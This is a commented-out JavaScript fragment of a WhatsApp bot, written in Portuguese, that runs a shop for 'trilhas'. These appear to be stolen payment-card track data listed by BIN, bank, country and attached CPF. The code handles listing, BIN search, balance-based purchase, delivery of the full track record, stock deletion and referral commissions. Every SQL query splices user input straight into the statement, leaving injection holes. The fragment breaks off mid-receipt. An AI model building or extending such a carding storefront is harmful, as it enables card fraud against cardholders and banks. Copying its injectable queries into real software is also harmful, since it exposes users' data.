        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto === "/deletarestoquetrilhas" && Adms.includes(Numero)) {
        //     await DataBase_Better.prepare(`DELETE FROM LOGINS`).run();
        //     Texto = `*ESTOQUE DE TRILHAS DELETADO COM SUCESSO!*`
        //     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //     }).catch(async(erro) => {
        //         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //     });
        //     return
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/textocomproutrilha===") > -1 && Adms.includes(Numero)) {
        //     try {
        //         msg = Mensagem_Texto.split("===")
        //         Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

        //         if (msg[1] === "" || Array_Total_Igual.length != 3) {
        //             Texto = `Comando inválido`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }
        //         MENSAGEM_AO_COMPRAR_TRILHAS = msg[1]
        //         await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MENSAGEM_AO_COMPRAR_TRILHAS}' WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_TRILHAS'`).run()

        //         Texto = `*TEXTO A EXIBIR QUANDO CLIENTE COMPRAR TRILHA, ALTERADO COM SUCESSO!*`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     } catch (error) {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //         Texto = `Comando inválido`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     }
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳





        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📠 TRILHAS") > -1) {
        //             TRILHAS = await DataBase_Better.prepare(`SELECT _rowid_,* FROM TRILHAS`).all();
        //             TRILHAS_COM_CPF = await DataBase_Better.prepare(`SELECT _rowid_,* FROM TRILHAS WHERE CPF != '0'`).all();
        //             TRILHAS_SEM_CPF = await DataBase_Better.prepare(`SELECT _rowid_,* FROM TRILHAS WHERE CPF = '0'`).all();

        //             Itens_Lista = []
        //             iD_Footer = Date.now()

        //             Itens_Lista.push(
        //                 {
        //                     rowId: `${iD_Footer.toString()}|`,
        //                     title: "🗃️ TODAS AS TRILHAS DISPONÍVEIS",
        //                     description: `Estoque Trilhas: ${TRILHAS.length}`,
        //                 },
        //                 {
        //                     rowId: `${iD_Footer.toString()}|`,
        //                     title: "📝 TRILHAS COM CPF",
        //                     description: `Estoque Trilhas com CPF: ${TRILHAS_COM_CPF.length}`,
        //                 },
        //                 {
        //                     rowId: `${iD_Footer.toString()}|`,
        //                     title: "📋 TRILHAS SEM CPF",
        //                     description: `Estoque Trilhas sem CPF: ${TRILHAS_SEM_CPF.length}`,
        //                 },
        //             )

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'OPÇÕES',
        //                 description: `*TRILHAS COM CPF OU SEM CPF?*

        // Caso queira pesquisar uma BIN para encontrar a trilha com mais rapidez basta usar este comando:

        // /tbin 544731`,
        //                 sections: [
        //                     {
        //                         title: "COM CPF OU SEM?",
        //                         rows: Itens_Lista
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response") {
        //             if (Mensagem_Texto.indexOf("🗃️ TODAS AS TRILHAS DISPONÍVEIS") > -1 || Mensagem_Texto.indexOf("📝 TRILHAS COM CPF") > -1 || Mensagem_Texto.indexOf("📋 TRILHAS SEM CPF") > -1) {

        //                 Array_Trilhas = []
        //                 if (Mensagem_Texto.indexOf("🗃️ TODAS AS TRILHAS DISPONÍVEIS") > -1) {
        //                     console.log("🗃️ TODAS AS TRILHAS DISPONÍVEIS")
        //                     Array_Trilhas = await DataBase_Better.prepare(`SELECT _rowid_,* FROM TRILHAS`).all();
        //                 }
        //                 if (Mensagem_Texto.indexOf("📝") > -1 && Mensagem_Texto.indexOf(" COM ") > -1 && Mensagem_Texto.indexOf("CPF") > -1) {
        //                     console.log("📝 TRILHAS COM CPF")
        //                     Array_Trilhas = await DataBase_Better.prepare(`SELECT _rowid_,* FROM TRILHAS WHERE CPF != '0'`).all();
        //                 }
        //                 if (Mensagem_Texto.indexOf("📋") > -1 && Mensagem_Texto.indexOf(" SEM ") > -1 && Mensagem_Texto.indexOf("CPF") > -1) {
        //                     console.log("📋 TRILHAS SEM CPF")
        //                     Array_Trilhas = await DataBase_Better.prepare(`SELECT _rowid_,* FROM TRILHAS WHERE CPF = '0'`).all();
        //                 }

        //                 Array_Botoes = []
        //                 for await (item of Array_Trilhas) {
        //                     //console.log(item)
        //                     ID = item["rowid"]
        //                     BIN = item["BIN"]
        //                     CPF = item["CPF"]
        //                     if (CPF.toString() === "0") {
        //                         CPF = "❌"
        //                     } else {
        //                         CPF = "✅"
        //                     }
        //                     LEVEL = item["LEVEL"]
        //                     PRECO = item["PRECO"]
        //                     PRECO = parseFloat(PRECO).toFixed(2)
        //                     if (PRECO === "NaN" || PRECO === null) { PRECO = "0" }
        //                     BANDEIRA = item["BANDEIRA"]
        //                     TIPO = item["TIPO"]
        //                     NIVEL = item["NIVEL"]
        //                     BANCO = item["BANCO"]
        //                     PAIS = item["PAIS"]

        //                     iD_Footer = Date.now()
        //                     Array_Botoes.push({
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: `BIN:${BIN} 💰R$:${PRECO}💰`,
        //                         description: `CPF:${CPF} LVL:${LEVEL} TP:${TIPO} NVL:${NIVEL} IDTRI#${ID}#`
        //                     })
        //                 }


        //                 Texto = `📠 *LISTA DE TRILHAS* 📠

        // Clique em *LISTA DE TRILHAS*, ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra.

        // ⚠️*MUITA ATENÇÃO AO ESCOLHER A TRILHA DESEJADA!*⚠️`

        //                 await client.sendListMessage(Mensagem_From, {
        //                     buttonText: 'LISTA DE TRILHAS',
        //                     description: Texto,
        //                     sections: [
        //                         {
        //                             title: "Selecione a trilha e clique no botão enviar.",
        //                             rows: Array_Botoes
        //                         },
        //                     ],
        //                 }).then(async (result) => {
        //                     await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.error('Error when sending: ', erro);
        //                 })
        //                 return
        //             }
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/tbin ") > -1) {

        //             msg = Mensagem_Texto.split(" ")
        //             if (msg[1] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             BIN = msg[1]

        //             Array_CCs = await DataBase_Better.prepare(`SELECT _rowid_,* FROM TRILHAS WHERE BIN = '${BIN}'`).all();

        //             if (Array_CCs.length === 0) {

        //                 Texto = `*Desculpe, estamos sem esta BIN no estoque de trilhas, verifique as outras opções.*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             iD_Footer = Date.now()
        //             Array_Botoes = []
        //             for await (item of Array_Trilhas) {
        //                 //console.log(item)
        //                 ID = item["rowid"]
        //                 BIN = item["BIN"]
        //                 CPF = item["CPF"]
        //                 if (CPF.toString() === "0") {
        //                     CPF = "❌"
        //                 } else {
        //                     CPF = "✅"
        //                 }
        //                 LEVEL = item["LEVEL"]
        //                 PRECO = item["PRECO"]
        //                 PRECO = parseFloat(PRECO).toFixed(2)
        //                 if (PRECO === "NaN" || PRECO === null) { PRECO = "0" }
        //                 BANDEIRA = item["BANDEIRA"]
        //                 TIPO = item["TIPO"]
        //                 NIVEL = item["NIVEL"]
        //                 BANCO = item["BANCO"]
        //                 PAIS = item["PAIS"]

        //                 iD_Footer = Date.now()
        //                 Array_Botoes.push({
        //                     rowId: `${iD_Footer.toString()}|`,
        //                     title: `BIN:${BIN} 💰R$:${PRECO}💰`,
        //                     description: `CPF:${CPF} LVL:${LEVEL} TP:${TIPO} NVL:${NIVEL} IDTRI#${ID}#`
        //                 })
        //             }


        //             Texto = `📠 *TRILHAS BIN ${BIN}* 📠

        // Clique em *LISTA DE TRILHAS*, ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra.

        // ⚠️*MUITA ATENÇÃO AO ESCOLHER A TRILHA DESEJADA!*⚠️`

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'LISTA DE TRILHAS',
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "Selecione a trilha e clique no botão enviar.",
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("IDTRI#") > -1) {
        //             Rowid_Trilha = Mensagem_Texto.split("IDTRI#")
        //             Rowid_Trilha = Rowid_Trilha[1].split("#")
        //             ID = Rowid_Trilha[0]

        //             ROWID = await DataBase_Better.prepare(`SELECT _rowid_ FROM TRILHAS WHERE _rowid_ = '${ID}'`).get()
        //             if (ROWID === undefined) {
        //                 Texto = `Desculpe, outra pessoa já comprou esta Trilha, escolha outra!`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             item = await DataBase_Better.prepare(`SELECT _rowid_,* FROM TRILHAS WHERE _rowid_ = '${ID}'`).get();

        //             ID = item["rowid"]
        //             BIN = item["BIN"]
        //             CPF = item["CPF"]
        //             LEVEL = item["LEVEL"]
        //             PRECO = item["PRECO"]
        //             if (PRECO === "NaN" || PRECO === null) { PRECO = "0" }
        //             TUDO_DA_TRILHA = item["TUDO_DA_TRILHA"]
        //             BANDEIRA = item["BANDEIRA"]
        //             TIPO = item["TIPO"]
        //             NIVEL = item["NIVEL"]
        //             BANCO = item["BANCO"]
        //             PAIS = item["PAIS"]

        //             PRECO_TRILHA = parseFloat(PRECO).toFixed(2)
        //             if (parseFloat(PRECO) === 0 || parseFloat(PRECO) === 0.00) {

        //                 Texto = `Não foi possível efetuar a compra desta trilha, pois o valor da mesma não foi definida pelo vendedor. Nossa equipe foi notificada!`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {

        //                     for await (adm of Adms) {
        //                         Texto = `*ATENÇÃO ADM*

        // Numero: wa.me/${NUMERO_USER_CONTROLE_VISIBILIDADE}, Tentou comprar uma trilha que não possui preço definido.

        // REVISE AS TABELAS DE PREÇOS E DEFINA OS PREÇOS DAS TRILHAS COM CUSTO R$:0`
        //                         await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         }).catch(async(erro) => {
        //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                         });
        //                     }
        //                     return
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return;
        //             }

        //             SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
        //             SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);
        //             if (parseFloat(SALDO_USUARIO) < parseFloat(PRECO_TRILHA)) {

        //                 Texto = `⚠️*Você não possui saldo suficiente para comprar esta trilha.*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return;
        //             }

        //             NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(PRECO_TRILHA)
        //             NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

        //             await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //             await DataBase_Better.prepare(`INSERT INTO TRILHAS_VENDIDAS (BIN,CPF,LEVEL,PRECO,TUDO_DA_TRILHA,BANDEIRA,TIPO,NIVEL,BANCO,PAIS,NUMERO_COMPRADOR,DATA_MS_INSERIDO) VALUES ('${BIN}','${CPF}','${LEVEL}','${PRECO}','${TUDO_DA_TRILHA}','${BANDEIRA}','${TIPO}','${NIVEL}','${BANCO}','${PAIS}','${Mensagem_From}','${Date.now()}')`).run()
        //             await DataBase_Better.prepare(`DELETE FROM TRILHAS WHERE _rowid_ = ${ID}`).run()

        //             VALOR_BASE_INDIC = PRECO_TRILHA
        //             Contato_Temp_Indic = Mensagem_From
        //             FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
        //             if (FUNCAO_ASSOCIADOS_PAGO === "1") {
        //                 ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
        //                 if (ATIVAR_ASSOCIADOS === "1") {

        //                     Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
        //                     if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
        //                         NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
        //                         PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
        //                         if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
        //                             PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
        //                         } else {
        //                             PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
        //                         }

        //                         PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
        //                         if (PIX_OU_COMPRA === "1") {

        //                         } else if (PIX_OU_COMPRA === "2") {
        //                             VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
        //                             VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
        //                             console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

        //                             SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
        //                             SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
        //                             console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

        //                             NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
        //                             NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
        //                             console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

        //                             await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
        //                             console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
        //                         }
        //                     }
        //                 }
        //             }

        //             MENSAGEM_AO_COMPRAR_TRILHAS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_TRILHAS'`).get()["VALOR"]

        //             Texto_Usuario = `📠 *TRILHA COMPRADA* 📠

        // *◇───────◇───────◇*
        // ⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
        // 💰 *VALOR:* R$: ${PRECO_TRILHA}
        // *◇───────◇───────◇*

        // ⚜️ *DADOS DA TRILHA* ⚜️

        // 🗒️ *CPF:* ${CPF}
        // 🆙 *LEVEL:* ${LEVEL}
        // 💳 *BIN:* ${BIN}
        // 🏳️ *BANDEIRA:* ${BANDEIRA}
        // ⚜️ *TIPO:* ${TIPO}
        // 💠 *NIVEL:* ${NIVEL}
        // 🏛 *BANCO:* ${BANCO}
        // 🌍 *PAIS:* ${PAIS}

        // 📠 *TRILHA*
        // ${TUDO_DA_TRILHA}

        // *❦ ════ •⊰❂⊱• ════ ❦*

        // ${MENSAGEM_AO_COMPRAR_TRILHAS}
        // `

